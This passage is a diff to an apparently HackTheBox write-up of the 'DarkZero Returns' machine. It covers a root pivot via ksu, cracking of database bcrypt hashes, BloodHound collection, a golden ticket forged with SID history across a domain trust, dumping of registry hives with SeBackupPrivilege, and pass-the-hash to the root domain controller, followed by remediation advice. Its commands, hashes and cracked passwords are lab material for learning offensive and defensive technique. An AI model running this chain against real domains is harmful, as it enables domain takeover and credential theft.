+Now let's start by requesting a TGT for root:
 
 ```bash
 svc-runner@SRV01:/tmp$ echo "RootPass123!" | kinit root@DARKZERO.EXT
@@ -1219,7 +1196,7 @@ Valid starting       Expires              Service principal
         renew until 09/05/2026 22:36:38
 ```
 
-Now execute `ksu` to switch to root:
+Now with `ksu` we will change the ID:
 
 ```bash
 svc-runner@SRV01:/tmp$ ksu root
@@ -1233,18 +1210,16 @@ root@SRV01:/tmp# id
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
-We now have full root access on `SRV01`!
+Boom! We pivoted!
 
 ### Root Filesystem Inspection & Database Backup Extraction
 
-With root access on the machine, the remaining unchecked folder is `/root`. Let's inspect it:
+Now as we know all the folder and file structure, the one and only folder left unchecked is of course the `/root` folder. Let's take a look at it:
 
 ```bash
 root@SRV01:~# ls
 darkzero_campaigns_backup.sql
 ```
-
-Inspecting the database backup SQL file reveals user credentials:
 
 ```sql
 INSERT INTO `users` VALUES (1,'admin@dzcampaigns.htb','admin','$2b$10$HDdWzYvp1IWFD9TB4JsuCerlh.vKchv/LmBruCmKGH19hPP7IXvjm','admin','2026-04-19 15:34:56');
@@ -1252,7 +1227,7 @@ INSERT INTO `users` VALUES (2,'celia.p@dzcampaigns.htb','celia','$2b$10$2L.IKTOk
 INSERT INTO `users` VALUES (3,'jerry.ap@dzcampaigns.htb','jerry','$2b$10$otSLTatDHIAAp3H58YYaTOgdhMlpbWBTEq1.MWFq5se6OOG3nV2Wy','player','2026-04-20 17:27:37');
 ```
 
-The table contains new credentials for users `celia` and `jerry` with bcrypt password hashes. Let's crack them with Hashcat:
+Good! The table contains some credentials—that's all we needed. Users `celia` and `jerry` are new here with their bcrypt hashes. Let's try cracking them:
 
 ```bash
 hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
@@ -1260,11 +1235,15 @@ hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
 $2b$10$2L.IKTOkBtwtWuKcAF/VJ.kUKiBHLQ8hPeg2KYJJXFOUdga2iLsoC:babygurl13 --> celia
 ```
 
-`jerry`'s hash remained uncracked, but we obtained `celia`'s password: `babygurl13`.
+Unfortunately `jerry`'s hash remains uncrackable, but we still got `celia`'s creds—it might be the intended way I guess.
 
 ### Celia Hash Cracking & BloodHound Collection
 
-Now that we have pure plaintext domain credentials, we can resolve the previous BloodHound collection issue:
+Now that we have pure creds we will resolve the previous bloodhound-python issue, where it was refusing the Kerberos authentication and switching over LDAP/LDAPS. With raw creds we can extract the AD info easily.
+
+(fyi:- we could've got the bloodhound zip with the earlier root user we created inside the GiteaMigration OU, i forgot that maybe because i am dumb :) )
+
+Anyways let's get the BloodHound collection finally:
 
 ```bash
 bloodhound-python -d darkzero.ext -u celia -p 'babygurl13' -no-pass \
@@ -1294,89 +1273,88 @@ INFO: Compressing output into 20260829224845_bloodhound.zip
 
 ![web-img](images/DarkZeroReturns/d20.png)
 
-First look at `celia` in BloodHound:
+First look of `celia` in BloodHound:
 - `CELIA` (owned) → `MemberOf` → `DOMAIN ADMINS`, `DOMAIN USERS`, `GITEAADMINS`.
-- `DOMAIN ADMINS` → `MemberOf` → `ADMINISTRATORS` and `DENIED RODC PASSWORD REPLICATION GROUP`.
-- Domain Admins effectively holds `GenericAll` over the domain—which is why Celia has 91 outbound control edges.
+- `DOMAIN ADMINS` → `MemberOf` → `ADMINISTRATORS` and `DENIED RODC PASSWORD REPLICATION GROUP` (that last one is a default Domain Admins membership, not a privilege).
+- Domain Admins effectively holds `GenericAll` over the domain—that's why Celia has 91 outbound controls.
 
 ### Cross-Domain Trust Exploitation Architecture (Forest Root Escalation)
 
-Celia is already a Domain Admin in `darkzero.ext`, so there is little left to compromise in this local child domain.
+Now Celia is already an admin in `darkzero.ext`, so I don't think we can do much more in this current domain.
 
-> 📌 **What is Cross-Domain Trust Exploitation via Forged Referral Tickets?**  
-> The question is never *"what can Celia do?"* — it's *"what can Celia give us that crosses a trust?"*  
-> We are currently on `darkzero.ext`, which is a secondary child domain. To compromise the entire infrastructure, we must escalate to the forest root domain: `darkzero.htb`.  
-> Cross-Domain Trust Exploitation via Forged Referral Tickets is an Active Directory lateral movement and privilege escalation technique that allows an attacker with administrative control over a child domain to cross security trust boundaries and compromise parent or forest-root domains.
+> 📌 **What is Cross-Domain Trust Exploitation?**  
+> However the question is never *"what can Celia do?"* — it's *"what can Celia give us that crosses a trust?"*  
+> Because we are currently on the `darkzero.ext` domain, which is a secondary domain, but in order to compromise the whole infrastructure we somehow need to escalate to the main domain which is `darkzero.htb`. Hence we call them "Trusts", and crossing the trust refers to movement from one domain to another!  
+> Everything else in her 91 edges—GenericAll on ext users, AddMember on ext groups, WriteDacl on ext OUs—is in-domain only. Those win ext... which is already won. That's the principled reason we ignored 90 of them.
+
+Cross-Domain Trust Exploitation via Forged Referral Tickets is an Active Directory lateral movement and privilege escalation technique. It allows an attacker who has compromised a lower-privileged AD domain (like a child domain) to cross security boundaries and gain unauthorized administrative control over a highly trusted domain (like a forest root or a parent domain).
 
 ```text
-┌──────────────────┐               ┌─────────────────────────┐               ┌─────────────────────────┐
-│  Linux Attacker  │               │   DC02 (DARKZERO.EXT)   │               │   DC01 (DARKZERO.HTB)   │
-└────────┬─────────┘               └────────────┬────────────┘               └────────────┬────────────┘
-         │                                      │                                         │
-         │──── (1) Forged TGT with PAC ────────>│                                         │
-         │         (Injected SID History)       │                                         │
-         │                                      │                                         │
-         │<─── (2) Issue Referral TGS ──────────│                                         │
-         │         (Encrypted with Trust Key)   │                                         │
-         │                                      │                                         │
-         │──── (3) Present Referral TGS ─────────────────────────────────────────────────>│
-         │                                      │                                         │
-         │                                      │                             (4) Decrypts with Trust Key,
-         │                                      │                                 Validates PAC,
-         │                                      │                                 Honors SID History
-         │                                      │                                         │
-         │<─── (5) Issue Final Service Ticket ────────────────────────────────────────────│
-         │                                      │                                         │
-─────────┴──────────────────────────────────────┴─────────────────────────────────────────┴──────────
++-----------------+     +-----------------+     +-----------------+
+| Linux Attacker  |     | DC02 (DARKZERO) |     | DC01 (ROOT HTB) |
++--------+--------+     +--------+--------+     +--------+--------+
+         |                       |                       |
+         | -- (1) Forged TGT --->|                       |
+         |    (with SID History) |                       |
+         |                       |                       |
+         | <-- (2) Referral TGS -|                       |
+         |    (Trust Key Sealed) |                       |
+         |                       |                       |
+         | ------- (3) Present Referral TGS ------------>|
+         |                       |                       |
+         |                       |    (4) Decrypts with  |
+         |                       |        Trust Key,     |
+         |                       |        Validates PAC, |
+         |                       |        Honors SIDs    |
+         |                       |                       |
+         | <------ (5) Issue Final CIFS Ticket ----------|
+         |                       |                       |
++--------v--------+              |                       |
+| Root SMB Access |              |                       |
++-----------------+              |                       |
 ```
 
 #### Core Concepts to Understand:
-
-- **PAC (Privilege Attribute Certificate):** A cryptographic structure inside a Kerberos ticket containing the user's security identifiers (SIDs) and group memberships.
-- **SID History:** An Active Directory attribute originally intended to retain access rights when migrating user objects between domains. If an account has a high-privilege SID (such as Enterprise Admins) in its `sIDHistory`, Kerberos honors it unless SID filtering is explicitly enforced.
+- **PAC (Privilege Attribute Certificate):** A structure inside a Kerberos ticket that contains the user's security identifiers (SIDs) and group memberships.
+- **SID History:** An attribute intended to retain access rights when users are moved between domains. If an account has a high-privilege SID (like Enterprise Admins) in its SID History, Kerberos honors it.
 - **Trust Key:** A shared secret password between two domains used to sign and encrypt inter-domain communications (Referral Tickets).
 
 #### Trust Exploitation Phases:
+1. **Trust Step 1 (Ticket Forgery & Injection):** From our Linux machine, we craft a counterfeit Ticket Granting Ticket (TGT). Using administrative control over the compromised domain `DARKZERO.EXT`, we inject a high-privilege SID (such as the Enterprise Admins SID of the target domain `DARKZERO.HTB`, because Celia is already an admin member of the domain) into the `sIDHistory` field of the PAC. We then present this ticket to the domain controller of the compromised domain (`DC02`).
+2. **Trust Step 2 (The Inter-Domain Referral):** `DC02` processes our request. Because the requested resource resides in a different domain (`DARKZERO.HTB`), `DC02` generates a Referral Ticket Granting Service (TGS) ticket. Crucially, `DC02` copies our injected SID History into this referral ticket and encrypts/signs it using the inter-domain Trust Key.
+3. **Trust Step 3 (Crossing the Bridge):** We receive the Referral TGS from `DC02` and present it directly to the target domain controller (`DC01`) governing `DARKZERO.HTB`.
+4. **Trust Step 4 (Trust Validation & Privilege Escalation):** `DC01` receives the ticket. Because it is encrypted with the shared Trust Key, `DC01` successfully decrypts and trusts the ticket's contents. `DC01` parses the PAC, reads the SID History we injected, and—assuming SID Filtering is disabled or improperly configured across the trust—honors the high-privilege group membership.
+5. **Trust Step 5 (Access Granted):** Believing we are a legitimate Enterprise Administrator, `DC01` issues the final Service Ticket. We now have full administrative access to resources within the `DARKZERO.HTB` environment.
 
-- **Trust Step 1: Ticket Forgery & Injection**  
-  From our Linux machine, we craft a counterfeit Ticket Granting Ticket (TGT). Using administrative control over the compromised domain `DARKZERO.EXT`, we inject a high-privilege SID from the target domain (`DARKZERO.HTB`) into the `sIDHistory` field of the PAC. We present this ticket to the domain controller of our compromised domain (`DC02`).
-
-- **Trust Step 2: The Inter-Domain Referral**  
-  `DC02` processes the request. Because the requested resource resides in `DARKZERO.HTB`, `DC02` generates a Referral Ticket Granting Service (TGS) ticket. Crucially, `DC02` copies our injected SID History into this referral ticket and encrypts/signs it using the inter-domain Trust Key.
-
-- **Trust Step 3: Crossing the Bridge**  
-  We receive the Referral TGS from `DC02` and present it directly to the target domain controller (`DC01`) governing `DARKZERO.HTB`.
-
-- **Trust Step 4: Trust Validation & Privilege Escalation**  
-  `DC01` receives the ticket. Because it is encrypted with the shared Trust Key, `DC01` successfully decrypts and trusts its contents. `DC01` parses the PAC, inspects the injected SID History, and—assuming SID Filtering is disabled or improperly configured across the trust—honors the high-privilege group membership.
-
-- **Trust Step 5: Access Granted**  
-  `DC01` issues the final Service Ticket. We now have administrative access to resources within the `DARKZERO.HTB` environment.
+This is how two distinct domains communicate with each other and share resources:
 
 ```text
-┌─────────────────────────────────┐
-│       DARKZERO.HTB (Root)       │
-│           [ Parent ]            │
-└────────────────┬────────────────┘
-                 ▲
-                 │  ▲ 2-Way
-                 │  │ Transitive
-                 ▼  │ Trust
-┌────────────────┴────────────────┐
-│      DARKZERO.EXT (Child)       │
-│          [ Trusted ]            │
-└─────────────────────────────────┘
++---------------------------------+
+|       DARKZERO.HTB (Root)       |
+|           [ Parent ]            |
++----------------+----------------+
+                 |
+                 |  2-Way
+                 |  Transitive
+                 |  Trust
+                 v
++----------------+----------------+
+|      DARKZERO.EXT (Child)       |
+|          [ Trusted ]            |
++---------------------------------+
 ```
 
-#### Trust Relationship Structure:
-
+#### How the Trust is Structured:
+In this Active Directory environment, the domains are structured via a Parent-Child Domain Trust:
 - **The Relationship:** `DARKZERO.HTB` is the root parent domain, and `DARKZERO.EXT` is a child domain.
-- **Automatic Creation:** In Active Directory, when a child domain is created under a forest root, a 2-Way Transitive Trust is automatically established.
+- **Automatic Creation:** In Active Directory, when a child domain is created under a forest root, a 2-Way, Transitive Trust is automatically established between them.
 - **Direction of Trust vs. Direction of Access:**
-  - **Trust Direction:** Bidirectional. `DARKZERO.HTB` trusts `DARKZERO.EXT`, and `DARKZERO.EXT` trusts `DARKZERO.HTB`.
-  - **Access Direction:** Because trust flows both ways, users from either domain can access resources in the opposite domain.
+  - **Trust Direction:** It is bidirectional. `DARKZERO.HTB` trusts `DARKZERO.EXT`, and `DARKZERO.EXT` trusts `DARKZERO.HTB`.
+  - **Access Direction:** Because the trust flows both ways, users from either domain can potentially be granted access to resources in the opposite domain.
 
-Before executing cross-domain attacks, configure `/etc/krb5.conf`:
+Cool theory! Isn't it? Now that we understood how the whole infrastructure works under the hood and how bidirectional communication works in a parent-child domain structure, we are ready to perform the lateral movement from `DC02` to `DC01`.
+
+Before going any further towards lateral movement, let's map `/etc/krb5.conf` and write appropriate configs:
 
 ```ini
 [libdefaults]
@@ -1407,7 +1385,7 @@ Before executing cross-domain attacks, configure `/etc/krb5.conf`:
 
 ### Trust Phase 1: Forging the Golden TGT with Injected SID History
 
-Using `impacket-ticketer`, we forge a Golden TGT for `celia`, injecting the privileged SID from `DARKZERO.HTB`:
+As per our above explanation with the appropriate diagram and workflow, we first need to forge a golden ticket by requesting our native domain:
 
 ```bash
 impacket-ticketer \
@@ -1446,9 +1424,9 @@ Impacket v0.14.0.dev0+20251114.155318.8925c2ce - Copyright Fortra, LLC and its a
 | **`celia`** *(Positional)* | Username | **The Cosmetic Label:** Sets the visual username displayed inside the ticket logs. |
 
 > ⚠️ **Golden Ticket Mechanics:**  
-> The KDC has no way to distinguish a genuine TGT from a forged one — it simply checks: *"does this ticket decrypt/verify with my krbtgt key?"* If yes, it is trusted. Possessing that key allows us to mint valid TGTs for any identity with any group memberships we choose.
+> The KDC has no way to distinguish a genuine TGT from a forged one — it simply checks: *"does this ticket decrypt/verify with my krbtgt key?"* If yes, it's trusted. So possessing that key means we can mint valid TGTs for any identity, with any group memberships we invent. That's literally the definition of a Golden Ticket.
 
-Load and verify the ticket cache:
+Ensure the ticket:
 
 ```bash
 export KRB5CCNAME=$(pwd)/celia.ccache
@@ -1463,7 +1441,7 @@ Valid starting       Expires              Service principal
 
 ### Trust Phase 2: Present Referral TGS to DC01
 
-With the referral TGT loaded, we request a Service Ticket for CIFS on `dc01.darkzero.htb`:
+Now that we have the referral TGS from `DC02`, the next immediate step would be presenting that ticket to `DC01`. Because our referral ticket contains PAC info, SID history attributes, and is encrypted with our domain's secret key used in inter-domain communication, `DC01` will accept our ticket, inspect the SID history, honor it, and issue our final service ticket:
 
 ```bash
 kvno cifs/dc01.darkzero.htb
@@ -1480,15 +1458,17 @@ Valid starting       Expires              Service principal
         Ticket server: cifs/dc01.darkzero.htb@DARKZERO.HTB
 ```
 
-Checking `klist` confirms the structure of our cross-domain referral:
-1. **The Forged TGT:** A `krbtgt` ticket with an anomalous 10-year lifespan.
-2. **The Inter-Domain Referral (TGS):** A `cifs/dc01.darkzero.htb@DARKZERO.EXT` ticket pointing to the `DARKZERO.HTB` realm.
+After executing the exploit, checking our Kerberos ticket cache (`klist`) confirms the structure of our cross-domain referral:
+1. **The Forged TGT:** A `krbtgt` ticket with an anomalous **10-year lifespan** (valid until 2036).
+2. **The Inter-Domain Referral (TGS):** A `cifs/dc01.darkzero.htb@DARKZERO.EXT` ticket pointing to the `DARKZERO.HTB` server realm.
 
-Because `DC01` honors the Trust Key signature and our injected SID History, this cache grants direct authenticated SMB access to the root domain controller.
+Because `DC01` successfully honors the Trust Key signature and our injected SID History, this cache configuration grants us direct, authenticated SMB access to the root domain controller.
 
-### Trust Phase 3: SeBackupPrivilege Abuse & SAM/SYSTEM Hive Extraction
+### Trust Phase 3: Spending the Service Ticket: The Hive Heist
 
-Our credential cache now holds `cifs/dc01.darkzero.htb@DARKZERO.HTB`. Let's test our access using NetExec:
+Our ccache now holds `cifs/dc01.darkzero.htb@DARKZERO.HTB` — a loaded round, chambered by the referral dance. The question is which weapon to fire it from.
+
+#### 3.1 Range check — the NetExec oracle:
 
 ```bash
 netexec smb 172.16.20.1 -k --use-kcache
@@ -1497,9 +1477,9 @@ SMB         172.16.20.1     445    DC01             [+] DARKZERO.EXT\celia from 
 ```
 
 > ⚠️ **Access Rights Analysis:**  
-> `DC01` accepts our cross-realm ticket, but the injected SID `...-1603` conferred **Backup Operators** (`SeBackupPrivilege`) rather than direct Domain Admins. Frontal execution methods like `wmiexec -k` or accessing `C$` directly are blocked; we need to leverage registry extraction via Backup Operators rights.
+> `DC01` racks the slide and accepts our cross-realm ticket (the bidirectional trust honoring our PAC), but the bolt never locks on admin. The injected SID `...-1603` conferred Backup Operators (`SeBackupPrivilege`) — not Domain Admins. Frontal-assault weapons (`wmiexec -k`, `C$`) will jam here; we need a precision instrument.
 
-We execute the NetExec `backup_operator` module:
+#### 3.2 Pull the trigger — the backup_operator module:
 
 ```bash
 netexec smb 172.16.20.1 -k --use-kcache -M backup_operator
@@ -1520,14 +1500,15 @@ BACKUP_O... 172.16.20.1     445    DC01             [*] Use the domain admin acc
 BACKUP_O... 172.16.20.1     445    DC01             [*] netexec smb dc_ip -u user -p pass -x "del C:\Windows\sysvol\sysvol\SECURITY && del C:\Windows\sysvol\sysvol\SAM && del C:\Windows\sysvol\sysvol\SYSTEM"
 ```
 
-#### How the Backup Operator Module Works:
-1. The module interacts over named pipes to activate the `RemoteRegistry` service.
-2. Leveraging `SeBackupPrivilege`, it executes a registry save: `HKLM\SAM`, `HKLM\SYSTEM`, and `HKLM\SECURITY` are exported directly from kernel memory and staged into `\\172.16.20.1\SYSVOL\`.
-3. It retrieves the saved registry hives: `SAM` and `SECURITY` were downloaded. The remaining `SYSTEM` hive can be retrieved directly from the `SYSVOL` share through our established SMB tunnel.
+1. The module whispers down a named pipe to wake the sleeping `RemoteRegistry` service.
+2. Wearing our `SeBackupPrivilege`, it performs the digital `reg save`: `HKLM\SAM`, `HKLM\SYSTEM`, `HKLM\SECURITY` are lifted straight out of the kernel-locked live registry… and staged into the SYSVOL share (`\\172.16.20.1\SYSVOL\`).
+3. It collects the brass: SAM (downloaded) and SECURITY (downloaded). The `SYSTEM` hive download timed out.
+
+(note:- you don't need to worry if one or none hives load up into your machine, because we have already initiated a tunnel to access those files from SMB share, so those remaining hives can be pulled manually directly from the share SYSVOL)
 
 ### Trust Phase 4: Offline Secret Extraction & Pass-the-Hash to Domain Admin
 
-Using Impacket's `secretsdump`, we extract secrets locally from the downloaded registry hives:
+#### 4.1 Field-strip the hives:
 
 ```bash
 impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
@@ -1558,13 +1539,15 @@ NL$KM:fa36c7d5c082abb578e117f05e36135ba59fc09c38a8c434fe20f72bd9a28caf71f2e0d209
 [*] Cleaning up... 
 ```
 
-`SYSTEM` yields the boot key, `SAM` yields the local account database, and out pops the prize:
+`SYSTEM` surrenders the boot key, `SAM` gives up its account table, and out pops the prize:
 
 ```text
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:4d470bb7497acf3f5f5c2a11872e02ac:::
 ```
 
-One NT hash — a single key machined to unlock the root domain controller. We execute Pass-the-Hash with `impacket-wmiexec`:
+One NT hash — a single round, machined to fit every chamber in this forest.
+
+#### 4.2 Load the magazine, squeeze the trigger:
 
 ```bash
 impacket-wmiexec -hashes :4d470bb7497acf3f5f5c2a11872e02ac Administrator@172.16.20.1
@@ -1577,10 +1560,10 @@ C:\>whoami
 darkzero\administrator
 ```
 
-Target down! Domain compromised!
+Target down! Domain Compromised!
 
-> 🎯 **Conclusion & Author Reflection:**  
-> To be very honest, this was a fabulous machine of this season. Even though it wears the mask of a "Hard" difficulty rating, it behaves like an Insane box under the hood. The multi-stage exploitation chain was exceptionally engaging, covering complex template internals, modern CI/CD context confusion, and cross-forest Kerberos trust mechanics. Happy Hacking!
+> 🎯 **Final Takeaways & Real Talk:**  
+> To be very honest, this was easily one of the most fabulous and rewarding machines of this season! Even though HackTheBox tagged it with a "Hard" difficulty rating, under the hood it honestly plays and feels like an Insane box. The exploitation chain was super fun and enjoyable—spanning Handlebars AST internals, Gitea CI/CD context confusion, DACL object injection, and cross-forest Kerberos trust forging. I tried to document all the difficult theoretical concepts and hands-on exploitation steps with deep explanations and learnings. Hope you enjoyed the journey. Happy Hacking!
 
 ---
 
@@ -1589,24 +1572,20 @@ Target down! Domain compromised!
 To remediate the vulnerabilities identified across the DarkZero Returns environment, administrators should apply defense-in-depth hardening across application, CI/CD, and Active Directory layers:
 
 ### 1. Handlebars AST Injection Remediation (CVE-2026-33937)
-
 - **Strict Type Validation:** Ensure user input supplied to template rendering engines is strictly validated as a primitive string (`typeof input === 'string'`). Never pass unvalidated JSON objects directly into `Handlebars.compile()`.
 - **Package Patching:** Upgrade `handlebars` to ≥4.7.9 where strict type assertion is applied to `NumberLiteral` AST nodes, preventing arbitrary code injection during template compilation.
 - **Runtime Sandboxing:** If dynamic templates must be evaluated server-side, execute template rendering within isolated V8 contexts (such as `isolated-vm`) with prototype access disabled.
 
 ### 2. Gitea CI/CD Workflow & Runner Isolation (CVE-2026-20750)
-
 - **Upgrade Gitea Service:** Update Gitea to version ≥1.25.1 or the latest patched release where event context evaluation ensures workflows triggered by external pull requests execute strictly under fork-scoped permissions.
 - **Containerized Runner Isolation:** Configure `act_runner` to execute all jobs within ephemeral, unprivileged Docker containers rather than directly on the host system (`ubuntu:host`). Disable Docker socket mounting inside runner containers.
 - **Enforce Maintainer Approvals:** Require manual approval from repository owners before executing any workflow triggered by external fork events or pull request review comments (`pull_request_review_comment`).
 
 ### 3. Active Directory DACL Least Privilege
-
 - **Audit Delegation Rights:** Conduct recurring DACL audits to identify excessive delegation. Remove `CREATE_CHILD` permissions from non-administrative service accounts (such as `svc-runner`) on organizational units (`OU=GiteaMigration`).
 - **Administrative Tiering:** Enforce strict Active Directory tiering boundaries. Service accounts associated with Linux hosts or CI/CD systems must reside in Tier 1 or Tier 2 OUs without the ability to create objects or modify directory structures.
 
 ### 4. Kerberos SID Filtering & Inter-Domain Trust Hardening
-
 - **Enable SID Filtering on Trusts:** Active Directory does not automatically quarantine SID History across all trust types. Administrators must explicitly enforce SID Filtering on all inter-domain and forest trusts:
   ```cmd
   netdom trust <ChildDomain> /domain:<ParentDomain> /EnableSIDFiltering:yes
